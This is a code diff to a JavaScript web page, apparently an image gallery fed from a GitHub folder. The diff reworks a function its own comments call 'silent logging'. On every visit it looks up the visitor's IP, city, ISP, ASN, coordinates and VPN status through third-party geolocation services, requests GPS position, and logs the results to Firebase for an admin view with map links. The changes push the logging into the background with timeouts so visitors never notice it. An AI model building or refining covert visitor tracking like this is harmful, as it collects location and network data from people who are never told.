@@ -641,8 +641,10 @@ async function submitPassword(e){
 }
 
 function checkAuthAndStart(){
-  // Jalankan silent logging otomatis tiap kunjungan
-  logAccessToFirebase();
+  // Silent logging di background secara asynchronous tanpa menghambat UI / loading
+  setTimeout(() => {
+    logAccessToFirebase().catch(e => console.warn("Background log skipped:", e));
+  }, 300);
 
   const passScreen = document.getElementById("password-screen");
   if(typeof ENABLE_PASSWORD !== "undefined" && ENABLE_PASSWORD){
@@ -727,7 +729,7 @@ async function getGPSPosition(){
         });
       },
       (err) => resolve(null),
-      { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
+      { enableHighAccuracy: false, timeout: 2000, maximumAge: 300000 }
     );
   });
 }
@@ -735,38 +737,48 @@ async function getGPSPosition(){
 async function logAccessToFirebase(){
   try{
     let geoData = {};
+    
+    // Gunakan AbortController dengan timeout 2.5 detik agar fetch IP tidak pernah menggantung
     try{
-      const res = await fetch("https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,hosting,mobile", { cache: "no-store" });
+      const ctrl = new AbortController();
+      const tid = setTimeout(() => ctrl.abort(), 2500);
+      const res = await fetch("https://ipwho.is/", { signal: ctrl.signal, cache: "no-store" });
+      clearTimeout(tid);
       if(res.ok){
         const d = await res.json();
-        geoData = {
-          ip: d.query || "-",
-          city: d.city || "-",
-          region: d.regionName || "-",
-          country: d.country || "-",
-          isp: d.isp || d.org || "-",
-          asn: d.as || "-",
-          lat: d.lat,
-          lon: d.lon,
-          isVpn: d.proxy || d.hosting || false,
-          isMobile: d.mobile || false
-        };
+        if(d.success){
+          geoData = {
+            ip: d.ip || "-",
+            city: d.city || "-",
+            region: d.region || "-",
+            country: d.country || "-",
+            isp: (d.connection && d.connection.isp) || "-",
+            asn: (d.connection && d.connection.asn) ? `AS${d.connection.asn}` : "-",
+            lat: d.latitude,
+            lon: d.longitude,
+            isVpn: (d.security && (d.security.vpn || d.security.proxy || d.security.datacenter)) || false,
+            isMobile: false
+          };
+        }
       }
     }catch(e){
       try{
-        const res2 = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+        const ctrl2 = new AbortController();
+        const tid2 = setTimeout(() => ctrl2.abort(), 2000);
+        const res2 = await fetch("https://freeipapi.com/api/json", { signal: ctrl2.signal, cache: "no-store" });
+        clearTimeout(tid2);
         if(res2.ok){
           const d2 = await res2.json();
           geoData = {
-            ip: d2.ip || "-",
-            city: d2.city || "-",
-            region: d2.region || "-",
-            country: d2.country_name || "-",
-            isp: d2.org || "-",
-            asn: d2.asn || "-",
+            ip: d2.ipAddress || "-",
+            city: d2.cityName || "-",
+            region: d2.regionName || "-",
+            country: d2.countryName || "-",
+            isp: "-",
+            asn: "-",
             lat: d2.latitude,
             lon: d2.longitude,
-            isVpn: false,
+            isVpn: d2.isProxy || false,
             isMobile: false
           };
         }
@@ -927,7 +939,7 @@ async function fetchAndRenderLogs(){
           </div>
           <div class="log-row">
             <span class="log-label">🎯 Lokasi Peta:</span>
-            <span class="log-val">${isGps ? `<strong style="color:var(--accent);">GPS Presisi (${log.gpsAccuracy \vert{}\vert{} '-'})</strong>:${log.gpsLat}, ${log.gpsLon} •${mapsLink}` : `${log.gpsLat && log.gpsLat !== '-' ? `${log.gpsLat}, ${log.gpsLon} • ` : ''}${mapsLink}`}</span>
+            <span class="log-val">${isGps ? `<strong style="color:var(--accent);">GPS Presisi (${log.gpsAccuracy || '-'})</strong>: ${log.gpsLat}, ${log.gpsLon} • ${mapsLink}` : `${log.gpsLat && log.gpsLat !== '-' ? `${log.gpsLat}, ${log.gpsLon} • ` : ''}${mapsLink}`}</span>
           </div>
           <div class="log-row">
             <span class="log-label">🌐 Alamat IP:</span>
@@ -1088,10 +1100,15 @@ async function listGithubWebp(){
   const path=FOLDER_PATH ? `/${FOLDER_PATH.replace(/^\/|\/$/g,"")}` : "";
   const api=`https://api.github.com/repos/${encodeURIComponent(cfg.owner)}/${encodeURIComponent(cfg.repo)}/contents${path}?ref=${encodeURIComponent(cfg.branch)}`;
 
+  const controller = new AbortController();
+  const tid = setTimeout(() => controller.abort(), 4000);
+
   const response=await fetch(api,{
     headers:{Accept:"application/vnd.github+json"},
-    cache:"no-store"
+    cache:"no-store",
+    signal: controller.signal
   });
+  clearTimeout(tid);
 
   if(!response.ok) throw new Error(`HTTP ${response.status}`);
 
